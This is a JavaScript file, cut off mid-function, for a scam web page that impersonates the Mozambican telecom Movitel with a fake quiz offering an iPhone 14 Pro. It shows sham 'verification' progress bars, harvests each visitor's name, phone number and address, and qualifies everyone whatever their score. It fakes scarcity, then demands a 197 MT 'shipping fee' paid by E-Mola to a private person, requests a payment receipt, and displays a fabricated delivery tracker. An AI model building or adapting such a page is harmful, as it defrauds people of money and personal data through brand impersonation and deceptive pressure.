const quizContainer = document.getElementById('quiz-container');
let currentQuestion = 0;
let answers = [];
let userPoints = 0;
let userInfo = {
  nome: '',
  telefone: '',
  provincia: '',
  distrito: '',
  bairro: ''
};

// Valores corretos para considerar que o usuário acertou (índices das opções corretas)
const correctAnswers = {
  0: 2, // 2011 (terceira opção na primeira pergunta)
  1: 2, // Todas as 11 províncias (terceira opção na segunda pergunta)
  2: 3, // Movitel, a tua rede (quarta opção na terceira pergunta)
  3: 2, // Movitel Money (terceira opção na quarta pergunta)
  4: 0, // Tmcel e Vodacom (primeira opção na quinta pergunta)
  5: 1, // 4G e fibra óptica (segunda opção na sexta pergunta)
  6: 0  // Sim (primeira opção na sétima pergunta)
};

// Províncias e distritos de Moçambique
const provinciasDistritos = {
  maputo: [
    "KaMpfumo", 
    "KaMaxakeni", 
    "KaMavota", 
    "KaMubukwana", 
    "KaTembe", 
    "KaNyaka",
    "Matola",
    "Boane",
    "Marracuene",
    "Manhiça",
    "Magude",
    "Moamba",
    "Namaacha",
    "Matutuíne"
  ],
  gaza: [
    "Xai-Xai",
    "Chibuto",
    "Chókwè",
    "Guijá",
    "Bilene",
    "Mandlakazi",
    "Massingir",
    "Mabalane",
    "Chicualacuala",
    "Massangena",
    "Chigubo",
    "Mapai",
    "Limpopo"
  ],
  inhambane: [
    "Inhambane",
    "Maxixe",
    "Vilankulo",
    "Massinga",
    "Morrumbene",
    "Jangamo",
    "Inharrime",
    "Zavala",
    "Homoine",
    "Panda",
    "Funhalouro",
    "Mabote",
    "Govuro",
    "Inhassoro"
  ],
  sofala: [
    "Beira",
    "Dondo",
    "Nhamatanda",
    "Búzi",
    "Gorongosa",
    "Marromeu",
    "Caia",
    "Chemba",
    "Cheringoma",
    "Machanga",
    "Muanza",
    "Chibabava",
    "Maringue"
  ],
  manica: [
    "Chimoio",
    "Gondola",
    "Manica",
    "Sussundenga",
    "Báruè",
    "Mossurize",
    "Machaze",
    "Macossa",
    "Guro",
    "Tambara",
    "Macate",
    "Vanduzi"
  ],
  tete: [
    "Tete",
    "Moatize",
    "Changara",
    "Cahora-Bassa",
    "Mutarara",
    "Angónia",
    "Tsangano",
    "Macanga",
    "Chiuta",
    "Mágoè",
    "Marávia",
    "Chifunde",
    "Dôa",
    "Zumbo",
    "Marara"
  ],
  zambezia: [
    "Quelimane",
    "Mocuba",
    "Gurué",
    "Alto Molócue",
    "Milange",
    "Maganja da Costa",
    "Pebane",
    "Namacurra",
    "Nicoadala",
    "Mopeia",
    "Morrumbala",
    "Inhassunge",
    "Chinde",
    "Ile",
    "Lugela",
    "Namarroi",
    "Gilé",
    "Luabo",
    "Mocubela",
    "Derre",
    "Molumbo",
    "Mulevala"
  ],
  nampula: [
    "Nampula",
    "Nacala",
    "Angoche",
    "Monapo",
    "Ilha de Moçambique",
    "Meconta",
    "Mogovolas",
    "Murrupula",
    "Mecubúri",
    "Ribáuè",
    "Malema",
    "Rapale",
    "Moma",
    "Mogincual",
    "Memba",
    "Liúpo",
    "Mossuril",
    "Lalaua",
    "Muecate",
    "Nacala-a-Velha",
    "Eráti",
    "Larde",
    "Nacarôa"
  ],
  cabo_delgado: [
    "Pemba",
    "Montepuez",
    "Mocímboa da Praia",
    "Palma",
    "Chiúre",
    "Mueda",
    "Macomia",
    "Nangade",
    "Quissanga",
    "Metuge",
    "Ancuabe",
    "Meluco",
    "Muidumbe",
    "Namuno",
    "Balama",
    "Mecúfi",
    "Ibo"
  ],
  niassa: [
    "Lichinga",
    "Cuamba",
    "Mandimba",
    "Metangula",
    "Marrupa",
    "Mecanhelas",
    "Lago",
    "Sanga",
    "Mavago",
    "Muembe",
    "Ngauma",
    "Majune",
    "Mecula",
    "Maúa",
    "Nipepe",
    "Metarica"
  ]
};

// Função para atualizar a pontuação no cabeçalho
function updateHeaderPoints() {
  const pointsDisplay = document.getElementById('points-display');
  if (pointsDisplay) {
    pointsDisplay.textContent = `Pontos: ${userPoints}/105`;
  }
}

function showWelcome() {
  // Atualizar pontos no cabeçalho
  updateHeaderPoints();
  
  quizContainer.innerHTML = `
    <h2>QUESTIONÁRIO PREMIADO - MOVITEL 13 ANOS</h2>
    
    <p>🎉 A Movitel completa 13 anos e com isso decidimos fazer um mega sorteio de um iPhone 14 Pro aos nossos usuários!</p>
    
    <img src="img/12mov.jpg" alt="iPhone 14 Pro">
    
    <p>Hoje é o último dia para responder o questionário e solicitar a sua premiação caso estejas qualificado.</p>
    
    <div style="background-color: #f8f8f8; padding: 15px; border-radius: 8px; margin: 15px 0; border-left: 4px solid #E53935;">
      <p><strong>COMO FUNCIONA:</strong></p>
      <p>1. Responda corretamente às perguntas sobre a Movitel</p>
      <p>2. Cada resposta correta vale 15 pontos</p>
      <p>3. Para ganhar o iPhone 14 Pro, você precisa de pelo menos 60 pontos</p>
      <p>4. Seu desempenho será avaliado instantaneamente</p>
    </div>
    
    <p>Podemos começar?</p>
    
    <button class="submit" onclick="startQuiz()">Participar Agora</button>
  `;
}

function startQuiz() {
  fbq('track', 'InitiateQuiz');
  showNameForm();
}

function showNameForm() {
  // Atualizar pontos no cabeçalho
  updateHeaderPoints();
  
  quizContainer.innerHTML = `
    <h2>Você é Cliente da Movitel?</h2>
    
    <p>Qual é o seu nome completo?</p>
    <p>(Vamos verificar se já participou antes para evitar duplicidade)</p>
    
    <input type="text" id="nome" class="field" placeholder="Digite seu nome completo">
    <div id="nome-error" class="error-message"></div>
    
    <button class="submit" onclick="validateName()">Enviar</button>
  `;
}

function validateName() {
  const nome = document.getElementById('nome').value.trim();
  const errorElement = document.getElementById('nome-error');
  
  if (nome.length < 3) {
    errorElement.textContent = 'Por favor, digite seu nome completo';
    return;
  }
  
  if (!/^[A-Za-zÀ-ÖØ-öø-ÿ\s]+$/.test(nome)) {
    errorElement.textContent = 'Por favor, digite apenas letras no seu nome';
    return;
  }
  
  userInfo.nome = nome;
  errorElement.textContent = '';
  
  // Mostrar verificação
  showVerification();
}

function showVerification() {
  // Atualizar pontos no cabeçalho
  updateHeaderPoints();
  
  quizContainer.innerHTML = `
    <h2>Verificando seus dados...</h2>
    
    <div class="progress-container">
      <div id="verification-progress" class="progress-bar" style="width: 0%"></div>
    </div>
    <p id="progress-text">0%</p>
    
    <div class="loader">
      <div class="spinner"></div>
    </div>
  `;
  
  // Animação de progresso gradual
  let progress = 0;
  const progressBar = document.getElementById('verification-progress');
  const progressText = document.getElementById('progress-text');
  
  const progressInterval = setInterval(function() {
    progress += 1;
    progressBar.style.width = progress + '%';
    progressText.textContent = progress + '%';
    
    if (progress >= 100) {
      clearInterval(progressInterval);
      setTimeout(function() {
        quizContainer.innerHTML = `
          <h2>Verificação completa!</h2>
          
          <p class="success-message">✅ Verificado! Seus dados estão qualificados para nosso questionário!</p>
          
          <button class="submit" onclick="showPhoneForm()">Continuar</button>
        `;
      }, 500);
    }
  }, 50); // 500ms x 100 = ~2 segundos para completar
}

function showPhoneForm() {
  // Atualizar pontos no cabeçalho
  updateHeaderPoints();
  
  quizContainer.innerHTML = `
    <h2>Por Favor Confirme</h2>
    
    <p>Para confirmar sua identidade, informe o seu número de contacto:</p>
    
    <input type="tel" id="telefone" class="field" placeholder="86XXXXXX ou 87XXXXXX">
    <div id="telefone-error" class="error-message"></div>
    
    <button class="submit" onclick="validatePhone()">Enviar</button>
  `;
}

function validatePhone() {
  const telefone = document.getElementById('telefone').value.trim();
  const errorElement = document.getElementById('telefone-error');
  
  if (!/^(86|87)\d{7}$/.test(telefone)) {
    errorElement.textContent = 'Por favor, digite um número Movitel válido (começando com 86 ou 87 seguido de 7 dígitos)';
    return;
  }
  
  userInfo.telefone = telefone;
  errorElement.textContent = '';
  
  // Mostrar tela de processamento
  showPhoneProcessing();
}

function showPhoneProcessing() {
  // Atualizar pontos no cabeçalho
  updateHeaderPoints();
  
  quizContainer.innerHTML = `
    <h2>Processando seu número...</h2>
    
    <div class="progress-container">
      <div id="phone-progress" class="progress-bar" style="width: 0%"></div>
    </div>
    <p id="phone-progress-text">0%</p>
    
    <div class="loader">
      <div class="spinner"></div>
    </div>
    
    <p>Verificando seu número na nossa base de dados, aguarde um momento...</p>
  `;
  
  // Animação de progresso gradual
  let progress = 0;
  const progressBar = document.getElementById('phone-progress');
  const progressText = document.getElementById('phone-progress-text');
  
  const progressInterval = setInterval(function() {
    progress += 1;
    progressBar.style.width = progress + '%';
    progressText.textContent = progress + '%';
    
    if (progress >= 100) {
      clearInterval(progressInterval);
      setTimeout(function() {
        // Avançar para apresentação
        showPresentation();
      }, 500);
    }
  }, 50); // 50ms x 100 = ~2.5 segundos para completar
}

function showPresentation() {
  // Atualizar pontos no cabeçalho
  updateHeaderPoints();
  
  quizContainer.innerHTML = `
    
    <img src="img/1 mov.png" alt="Celebração Movitel">
    
    <p>🎊 Parabéns! Seja bem-vindo ao questionário premiado da Movitel, que acontece uma vez por ano para ganhar um iPhone 14 Pro entre outros prêmios.</p>
    
    <p>O tempo de duração médio das perguntas é de 3 a 5 minutos.</p>
    
    <p>Podemos continuar?</p>
    
    <button class="submit" onclick="showQuestion(0)">Continuar</button>
  `;
}

function showQuestion(index) {
  // Atualizar pontos no cabeçalho
  updateHeaderPoints();
  
  // Criar elemento de progresso
  const progressPercent = ((index + 1) / quizData.length) * 100;
  
  const q = quizData[index];
  quizContainer.innerHTML = `
    <div class="points-display" style="text-align: center; background-color: #f8f8f8; padding: 10px; border-radius: 5px; margin-bottom: 15px;">
      <p style="margin: 0; font-weight: bold;">Seus pontos: <span style="color: #E53935;">${userPoints}</span> / 105</p>
    </div>
    
    <div class="progress-container">
      <div class="progress-bar" style="width: ${progressPercent}%"></div>
    </div>
    
    <h2>Pergunta ${index + 3}:</h2>
    
    ${q.image ? `<img src="${q.image}" alt="Imagem da pergunta">` : ''}
    
    <p>${q.question}</p>
    
    <div class="options-container">
      ${q.options.map((option, i) => `
        <button class="option" data-index="${i}">${option}</button>
      `).join('')}
    </div>
  `;
  
  // Adicionar event listeners aos botões
  document.querySelectorAll('.option').forEach((button, buttonIndex) => {
    button.addEventListener('click', () => {
      // Verificar se a resposta está correta
      const isCorrect = (buttonIndex === correctAnswers[index]);
      
      // Guardar resposta
      answers.push({
        question: q.question,
        answer: button.textContent,
        isCorrect: isCorrect
      });
      
      // Mostrar feedback antes de avançar
      showAnswerFeedback(isCorrect, index);
    });
  });
}

function showAnswerFeedback(isCorrect, questionIndex) {
  // Desabilitar todos os botões de opção para evitar cliques duplos
  document.querySelectorAll('.option').forEach(btn => {
    btn.disabled = true;
    btn.style.opacity = '0.7';
    btn.style.cursor = 'default';
  });
  
  // Mostrar feedback
  const feedbackDiv = document.createElement('div');
  feedbackDiv.style.padding = '15px';
  feedbackDiv.style.borderRadius = '8px';
  feedbackDiv.style.margin = '15px 0';
  feedbackDiv.style.textAlign = 'center';
  
  if (isCorrect) {
    // Adicionar pontos
    userPoints += 15;
    
    // Atualizar pontos no cabeçalho
    updateHeaderPoints();
    
    feedbackDiv.style.backgroundColor = '#e8f5e9';
    feedbackDiv.style.color = '#2e7d32';
    feedbackDiv.innerHTML = `
      <p style="font-weight: bold; margin: 0;">✅ Resposta Correta!</p>
      <p style="margin: 5px 0 0;">Você ganhou +15 pontos!</p>
    `;
  } else {
    feedbackDiv.style.backgroundColor = '#ffebee';
    feedbackDiv.style.color = '#c62828';
    feedbackDiv.innerHTML = `
      <p style="font-weight: bold; margin: 0;">❌ Resposta Incorreta</p>
      <p style="margin: 5px 0 0;">Tente acertar a próxima pergunta!</p>
    `;
  }
  
  // Atualizar a exibição de pontos dentro do formulário de quiz (se existir)
  const pointsDisplayInQuiz = document.querySelector('.points-display p');
  if (pointsDisplayInQuiz) {
    pointsDisplayInQuiz.innerHTML = `Seus pontos: <span style="color: #E53935;">${userPoints}</span> / 105`;
  }
  
  // Inserir feedback antes do próximo botão
  quizContainer.appendChild(feedbackDiv);
  
  // Adicionar botão de continuar
  const continueBtn = document.createElement('button');
  continueBtn.className = 'submit';
  continueBtn.textContent = 'Continuar';
  continueBtn.onclick = function() {
    // Avançar
    currentQuestion++;
    
    if (currentQuestion >= quizData.length) {
      showConclusion();
    } else {
      showQuestion(currentQuestion);
    }
  };
  
  quizContainer.appendChild(continueBtn);
}

function showConclusion() {
  // Atualizar pontos no cabeçalho
  updateHeaderPoints();
  
  quizContainer.innerHTML = `
    <div class="points-display" style="text-align: center; background-color: #f8f8f8; padding: 10px; border-radius: 5px; margin-bottom: 15px;">
      <p style="margin: 0; font-weight: bold;">Pontuação Final: <span style="color: #E53935;">${userPoints}</span> / 105</p>
    </div>
    
    <img src="img/6mov.png" alt="Parabéns">
    
    ${userPoints >= 60 ? 
      `<div style="background-color: #e8f5e9; padding: 15px; border-radius: 8px; margin: 15px 0; text-align: center;">
        <p style="font-weight: bold; color: #2e7d32; margin: 0;">🎉 PARABÉNS! Você atingiu a pontuação mínima necessária!</p>
        <p style="margin: 5px 0 0;">Você está qualificado para receber o iPhone 14 Pro!</p>
       </div>` 
      : 
      `<div style="background-color: #ffebee; padding: 15px; border-radius: 8px; margin: 15px 0; text-align: center;">
        <p style="font-weight: bold; color: #c62828; margin: 0;">⚠️ ATENÇÃO!</p>
        <p style="margin: 5px 0 0;">Você não atingiu a pontuação mínima, mas ainda tem uma chance! Complete o formulário abaixo.</p>
       </div>`
    }
    
    <p>😍 Você completou todas as perguntas com sucesso!</p>
    
    <p>🎁 Complete seus dados para verificarmos se você pode receber seu iPhone 14 Pro!</p>
    
    <p>Informe o nome da sua cidade e o bairro em que você se localiza para realizarmos o envio do prêmio:</p>
    
    <select id="provincia" class="field" onchange="loadDistritos()">
      <option value="">Selecione a província</option>
      <option value="maputo">Maputo</option>
      <option value="gaza">Gaza</option>
      <option value="inhambane">Inhambane</option>
      <option value="sofala">Sofala</option>
      <option value="manica">Manica</option>
      <option value="tete">Tete</option>
      <option value="zambezia">Zambézia</option>
      <option value="nampula">Nampula</option>
      <option value="cabo_delgado">Cabo Delgado</option>
      <option value="niassa">Niassa</option>
    </select>
    
    <select id="distrito" class="field" style="display: none;">
      <option value="">Selecione o distrito/cidade</option>
    </select>
    
    <input type="text" id="bairro" class="field" placeholder="Digite o nome do seu bairro" style="display: none;">
    
    <div id="location-error" class="error-message"></div>
    
    <button id="btn-location" class="submit" onclick="validateLocation()" style="display: none;">Confirmar Localização</button>
  `;
}

function loadDistritos() {
  const provinciaSelect = document.getElementById('provincia');
  const distritoSelect = document.getElementById('distrito');
  const bairroInput = document.getElementById('bairro');
  const btnLocation = document.getElementById('btn-location');
  
  const provinciaValue = provinciaSelect.value;
  
  if (provinciaValue) {
    // Limpar opções atuais
    distritoSelect.innerHTML = '<option value="">Selecione o distrito/cidade</option>';
    
    // Adicionar novas opções baseadas na província selecionada
    if (provinciasDistritos[provinciaValue]) {
      provinciasDistritos[provinciaValue].forEach(distrito => {
        const option = document.createElement('option');
        option.value = distrito.toLowerCase().replace(/\s/g, '_');
        option.textContent = distrito;
        distritoSelect.appendChild(option);
      });
    }
    
    // Mostrar select de distrito
    distritoSelect.style.display = 'block';
    
    // Guardar província selecionada
    userInfo.provincia = provinciaSelect.options[provinciaSelect.selectedIndex].text;
    
    // Listener para mudança de distrito
    distritoSelect.onchange = function() {
      if (distritoSelect.value) {
        bairroInput.style.display = 'block';
        userInfo.distrito = distritoSelect.options[distritoSelect.selectedIndex].text;
      } else {
        bairroInput.style.display = 'none';
      }
    };
    
    // Listener para input do bairro
    bairroInput.oninput = function() {
      if (bairroInput.value.trim()) {
        btnLocation.style.display = 'block';
        userInfo.bairro = bairroInput.value.trim();
      } else {
        btnLocation.style.display = 'none';
      }
    };
  } else {
    distritoSelect.style.display = 'none';
    bairroInput.style.display = 'none';
    btnLocation.style.display = 'none';
  }
}

function validateLocation() {
  const errorElement = document.getElementById('location-error');
  
  if (!userInfo.provincia || !userInfo.distrito || !userInfo.bairro) {
    errorElement.textContent = 'Por favor, preencha todos os campos de localização';
    return;
  }
  
  errorElement.textContent = '';
  showDeliveryDetails();
}

function showDeliveryDetails() {
  // Atualizar pontos no cabeçalho
  updateHeaderPoints();
  
  quizContainer.innerHTML = `
    <div class="points-display" style="text-align: center; background-color: #f8f8f8; padding: 10px; border-radius: 5px; margin-bottom: 15px;">
      <p style="margin: 0; font-weight: bold;">Pontuação Final: <span style="color: #E53935;">${userPoints}</span> / 105</p>
    </div>
    
    <h2>Detalhes da Entrega</h2>
    
    <img src="img/9mov.png" alt="Entrega">
    
    <p>🎉 Parabéns! Qualificamos você para ganhar o iPhone 14 Pro exclusivo da Movitel pelo 13º aniversário da nossa operadora!</p>
    
    <p>A entrega do prêmio será realizada pelo Portador Diário, nossa empresa parceira.</p>
    
    <p>De acordo com a sua localização, o pagamento do transporte custará apenas 197 MT.</p>
    
    <p>Todos os custos com o prêmio ficam por nossa conta. Você paga somente o transporte!</p>
    
    <p class="remaining">Restam apenas 2 vagas!</p>
    
    <p>Gostaria de prosseguir para receber o seu prêmio?</p>
    
    <button class="submit" onclick="showPaymentInstructions()">Sim, quero receber meu prêmio</button>
    <button class="submit" style="background-color: #757575; margin-top: 10px;" onclick="alert('Obrigado por participar!')">Não, obrigado</button>
  `;
}

function showPaymentInstructions() {
  fbq('track', 'InitiateCheckout', {
    value: 197.00,
    currency: 'MZN',
    content_name: 'Taxa de Envio iPhone 14 Pro',
    content_ids: ['iphone14pro_delivery']
    });
  // Atualizar pontos no cabeçalho
  updateHeaderPoints();
  
  // Calcular valor do envio baseado na localização (simulação)
  const taxaEnvio = "197";
  
  quizContainer.innerHTML = `
    <div style="text-align: center; margin-bottom: 20px;">
      <h2 style="margin-bottom: 5px;">Checkout</h2>
      <p style="color: #666; margin-top: 0;">Complete o pagamento para receber seu prêmio</p>
    </div>
    
    <!-- Resumo do pedido -->
    <div style="background-color: #f8f9fa; padding: 15px; border-radius: 8px; margin-bottom: 20px; border: 1px solid #e1e4e8;">
      <h3 style="margin-top: 0; font-size: 1.1rem; color: #333;">Resumo do Pedido</h3>
      
      <div style="display: flex; margin-bottom: 15px; align-items: center;">
        <div style="width: 80px; height: 80px; background-color: #eee; border-radius: 8px; overflow: hidden; margin-right: 15px;">
          <img src="img/7mov.png" alt="iPhone 14 Pro" style="width: 100%; height: 100%; object-fit: cover;">
        </div>
        <div>
          <p style="margin: 0 0 5px 0; font-weight: bold;">iPhone 14 Pro</p>
          <p style="margin: 0; color: #666; font-size: 0.9rem;">Prêmio do 13º Aniversário Movitel</p>
          <p style="margin: 5px 0 0 0; font-size: 0.9rem;">Pontuação: <span style="color: #FF5722; font-weight: bold;">${userPoints}/105</span></p>
        </div>
      </div>
      
      <div style="border-top: 1px solid #ddd; padding-top: 12px;">
        <div style="display: flex; justify-content: space-between; margin-bottom: 8px;">
          <span>Valor do Produto:</span>
          <span style="font-weight: bold;">0,00 MT</span>
        </div>
        <div style="display: flex; justify-content: space-between; margin-bottom: 8px;">
          <span>Taxa de Envio:</span>
          <span style="font-weight: bold;">${taxaEnvio},00 MT</span>
        </div>
        <div style="display: flex; justify-content: space-between; padding-top: 8px; border-top: 1px dashed #ddd; font-weight: bold;">
          <span>Total:</span>
          <span style="color: #FF5722;">${taxaEnvio},00 MT</span>
        </div>
      </div>
    </div>
    
    <!-- Informações do cliente -->
    <div style="background-color: #f8f9fa; padding: 15px; border-radius: 8px; margin-bottom: 20px; border: 1px solid #e1e4e8;">
      <h3 style="margin-top: 0; font-size: 1.1rem; color: #333;">Dados do Cliente</h3>
      
      <div style="margin-bottom: 12px;">
        <p style="margin: 0 0 3px 0; color: #666; font-size: 0.9rem;">Nome:</p>
        <p style="margin: 0; font-weight: bold;">${userInfo.nome || "Nome não fornecido"}</p>
      </div>
      
      <div style="margin-bottom: 12px;">
        <p style="margin: 0 0 3px 0; color: #666; font-size: 0.9rem;">Contacto:</p>
        <p style="margin: 0; font-weight: bold;">${userInfo.telefone || "Telefone não fornecido"}</p>
      </div>
      
      <div style="display: flex; margin-bottom: 0;">
        <div style="flex: 1; margin-right: 10px;">
          <p style="margin: 0 0 3px 0; color: #666; font-size: 0.9rem;">Província:</p>
          <p style="margin: 0; font-weight: bold;">${userInfo.provincia || "Província não selecionada"}</p>
        </div>
        <div style="flex: 1;">
          <p style="margin: 0 0 3px 0; color: #666; font-size: 0.9rem;">Distrito:</p>
          <p style="margin: 0; font-weight: bold;">${userInfo.distrito || "Distrito não selecionado"}</p>
        </div>
      </div>
      
      <div style="margin-top: 12px;">
        <p style="margin: 0 0 3px 0; color: #666; font-size: 0.9rem;">Bairro:</p>
        <p style="margin: 0; font-weight: bold;">${userInfo.bairro || "Bairro não fornecido"}</p>
      </div>
    </div>
    
    <!-- Status do pagamento -->
    <div id="payment-status-pending" style="background-color: #fff9c4; padding: 15px; border-radius: 8px; margin-bottom: 20px; border: 1px solid #ffd54f; display: flex; align-items: center;">
      <div style="width: 24px; height: 24px; border-radius: 50%; background-color: #ffc107; display: flex; justify-content: center; align-items: center; margin-right: 12px;">
        <span style="color: white; font-weight: bold; font-size: 14px;">!</span>
      </div>
      <div>
        <p style="margin: 0; font-weight: bold; color: #f57c00;">Pagamento Pendente</p>
        <p style="margin: 5px 0 0 0; font-size: 0.9rem; color: #666;">Realize o pagamento para que possamos processar seu pedido</p>
      </div>
    </div>
    
    <!-- Status de pagamento confirmado (inicialmente oculto) -->
    <div id="payment-status-confirmed" style="background-color: #e8f5e9; padding: 15px; border-radius: 8px; margin-bottom: 20px; border: 1px solid #a5d6a7; display: none; align-items: center;">
      <div style="width: 24px; height: 24px; border-radius: 50%; background-color: #4caf50; display: flex; justify-content: center; align-items: center; margin-right: 12px;">
        <span style="color: white; font-weight: bold; font-size: 14px;">✓</span>
      </div>
      <div>
        <p style="margin: 0; font-weight: bold; color: #2e7d32;">Pagamento Confirmado</p>
        <p style="margin: 5px 0 0 0; font-size: 0.9rem; color: #666;">Seu pedido está sendo processado e será entregue em breve</p>
      </div>
    </div>
    
    <!-- Instruções de pagamento -->
    <div style="background-color: #f8f9fa; padding: 15px; border-radius: 8px; margin-bottom: 20px; border: 1px solid #e1e4e8;">
      <h3 style="margin-top: 0; font-size: 1.1rem; color: #333;">Instruções de Pagamento</h3>
      
      <p style="margin: 0 0 15px 0;">Para finalizar, é necessário pagar a taxa de envio (${taxaEnvio} MT) através de um dos métodos abaixo:</p>
      
      <div style="background-color: white; padding: 12px; border-radius: 6px; border: 1px solid #ddd; margin-bottom: 12px;">
        <div style="display: flex; align-items: center; justify-content: space-between;">
          <div style="display: flex; align-items: center;">
            <span style="background-color: #2196F3; color: white; width: 30px; height: 30px; border-radius: 50%; display: flex; justify-content: center; align-items: center; margin-right: 12px;">
              <span style="font-size: 14px;">📲</span>
            </span>
            <div>
              <p style="margin: 0; font-weight: bold;">E-Mola</p>
              <p style="margin: 3px 0 0 0; font-size: 0.9rem; color: #666;">Número: <span id="emola-number" style="font-weight: bold;">863881471</span></p>
            </div>
          </div>
          <button class="copy-button" onclick="copyToClipboard('863881471')">Copiar</button>
        </div>
      </div>
      
      <p style="margin: 15px 0; font-weight: bold;">Dados do Beneficiário:</p>
      <p style="margin: 0 0 8px 0;">● 👤 Nome: AMADE ALBERTO MADINGANHE</p>
      <p style="margin: 0 0 15px 0;">● 🚚 Empresa: Movitel Moçambique</p>
      
      <div style="background-color: #e8f5e9; padding: 12px; border-radius: 6px; border: 1px solid #a5d6a7;">
        <p style="margin: 0; font-size: 0.9rem;">💡 <strong>Dica:</strong> Envie o comprovante de pagamento abaixo para agilizar a entrega do seu prêmio.</p>
      </div>
    </div>
    
    <!-- Upload do comprovativo -->
    <div id="comprovativo-section" style="background-color: #f8f9fa; padding: 15px; border-radius: 8px; margin-bottom: 20px; border: 1px solid #e1e4e8;">
      <h3 style="margin-top: 0; font-size: 1.1rem; color: #333;">Envio do Comprovativo</h3>
      
      <p style="margin: 0 0 15px 0;">Após efetuar o pagamento, faça o upload do comprovativo:</p>
      
      <div style="border: 2px dashed #ddd; border-radius: 6px; padding: 20px; text-align: center; margin-bottom: 15px; background-color: white;" id="drop-area">
        <img src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iNTAiIGhlaWdodD0iNTAiIHZpZXdCb3g9IjAgMCAyNCAyNCIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj48cGF0aCBkPSJNMTEgMTVoMlY2aC0ydjl6bTAtMTJoMlYxaC0ydjJ6TTMuNSAxMS4zM2wxLjQxLTEuNDFMOS4xNyAxNC4xN2wtMS40MSAxLjQxTDMuNSAxMS4zM3pNMTMuNDMgMTQuMTdsNC4yNS00LjI1IDEuNDEgMS40MS00LjI1IDQuMjUtMS40MS0xLjQxek0zLjUgNy43NWw0LjI1LTQuMjUgMS40MSAxLjQxLTQuMjUgNC4yNUwzLjUgNy43NXptMTQuMzQgMGwxLjQxLTEuNDEgNC4yNSA0LjI1LTEuNDEgMS40MS00LjI1LTQuMjV6TTE0LjUgMjFWMjNoLTJ2LTJoLTJ2LTJoNnYyaC0yeiIgZmlsbD0iI2JiYiIvPjwvc3ZnPg==" alt="Upload" style="width: 50px; height: 50px; margin-bottom: 10px;">
        <p style="margin: 0 0 10px 0; font-weight: bold; color: #666;">Arraste o comprovativo para aqui</p>
        <p style="margin: 0; color: #999; font-size: 0.9rem;">ou</p>
        <input type="file" id="comprovativo-file" accept="image/*" style="display: none;">
        <button onclick="document.getElementById('comprovativo-file').click();" style="background-color: #f5f5f5; border: 1px solid #ddd; color: #333; padding: 8px 15px; border-radius: 4px; margin-top: 10px; cursor: pointer;">Selecionar arquivo</button>
        <p style="margin: 10px 0 0 0; font-size: 0.8rem; color: #999;">Formatos aceitos: JPG, PNG, PDF (máx. 5MB)</p>
      </div>
      
      <!-- Preview do arquivo (inicialmente oculto) -->
      <div id="file-preview" style="display: none; margin-top: 15px; background-color: white; border: 1px solid #ddd; border-radius: 6px; padding: 12px;">
        <div style="display: flex; align-items: center; justify-content: space-between;">
          <div style="display: flex; align-items: center;">
            <div style="width: 40px; height: 40px; background-color: #e3f2fd; border-radius: 4px; display: flex; justify-content: center; align-items: center; margin-right: 12px;">
              <span style="font-size: 20px;">📄</span>
            </div>
            <div>
              <p id="file-name" style="margin: 0; font-weight: bold; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; max-width: 200px;">comprovativo.jpg</p>
              <p id="file-size" style="margin: 3px 0 0 0; font-size: 0.8rem; color: #666;">0 KB</p>
            </div>
          </div>
          <button onclick="removeFile()" style="background: none; border: none; color: #F44336; cursor: pointer; font-size: 0.9rem;">Remover</button>
        </div>
      </div>
      
      <button class="submit" id="btn-confirmar-pagamento" style="margin-top: 15px;" onclick="confirmarPagamento()">Confirmar Pagamento</button>
    </div>
    
    <!-- Acompanhamento (inicialmente oculto) -->
    <div id="tracking-section" style="display: none; background-color: #f8f9fa; padding: 15px; border-radius: 8px; margin-bottom: 20px; border: 1px solid #e1e4e8;">
      <h3 style="margin-top: 0; font-size: 1.1rem; color: #333;">Acompanhamento do Pedido</h3>
      
      <div style="margin: 15px 0;">
        <div style="display: flex; margin-bottom: 15px;">
          <div style="width: 28px; display: flex; flex-direction: column; align-items: center;">
            <div style="width: 28px; height: 28px; border-radius: 50%; background-color: #4caf50; display: flex; justify-content: center; align-items: center; z-index: 2;">
              <span style="color: white; font-weight: bold; font-size: 14px;">✓</span>
            </div>
            <div style="width: 2px; height: 100%; background-color: #4caf50; margin: 5px 0;"></div>
          </div>
          <div style="margin-left: 12px;">
            <p style="margin: 0; font-weight: bold;">Pagamento Confirmado</p>
            <p style="margin: 3px 0 0 0; font-size: 0.9rem; color: #666;">15/05/2025 - ${new Date().getHours()}:${String(new Date().getMinutes()).padStart(2, '0')}</p>
          </div>
        </div>
        
        <div style="display: flex; margin-bottom: 15px;">
          <div style="width: 28px; display: flex; flex-direction: column; align-items: center;">
            <div style="width: 28px; height: 28px; border-radius: 50%; background-color: #2196F3; display: flex; justify-content: center; align-items: center; z-index: 2;">
              <span style="color: white; font-weight: bold; font-size: 14px;">2</span>
            </div>
            <div style="width: 2px; height: 100%; background-color: #bdbdbd; margin: 5px 0;"></div>
          </div>
          <div style="margin-left: 12px;">
            <p style="margin: 0; font-weight: bold;">Em Processamento</p>
            <p style="margin: 3px 0 0 0; font-size: 0.9rem; color: #666;">Seu pedido está sendo preparado</p>
          </div>
        </div>
        
        <div style="display: flex;">
          <div style="width: 28px; display: flex; flex-direction: column; align-items: center;">
            <div style="width: 28px; height: 28px; border-radius: 50%; background-color: #bdbdbd; display: flex; justify-content: center; align-items: center; z-index: 2;">
              <span style="color: white; font-weight: bold; font-size: 14px;">3</span>
            </div>
          </div>
          <div style="margin-left: 12px;">
            <p style="margin: 0; font-weight: bold;">Entrega</p>
            <p style="margin: 3px 0 0 0; font-size: 0.9rem; color: #666;">Previsto para 16/05/2025 - 17/05/2025</p>
          </div>
        </div>
      </div>
      
      <div style="background-color: #e8f5e9; padding: 12px; border-radius: 6px; border: 1px solid #a5d6a7; margin-top: 15px;">
        <p style="margin: 0; font-size: 0.9rem;">💬 <strong>Dúvidas?</strong> Entre em contato pelo WhatsApp: <a href="https://wa.me/258866545876" style="color: #2196F3; text-decoration: none; font-weight: bold;">+258 86 149 7642</a></p>
      </div>
    </div>
    
    <!-- Lembrete -->
    <p style="margin: 0 0 15px 0; color: #666; font-size: 0.9rem; text-align: center;">Prazo de entrega: 1 a 2 dias após confirmação do pagamento</p>
  `;
  
  // Marcar como participante
  localStorage.setItem('participouQuizMovitel', 'true');
  
  // Configurar o upload de arquivo
  setupFileUpload();
}

// Configurar a funcionalidade de upload de arquivo
function setupFileUpload() {
  const fileInput = document.getElementById('comprovativo-file');
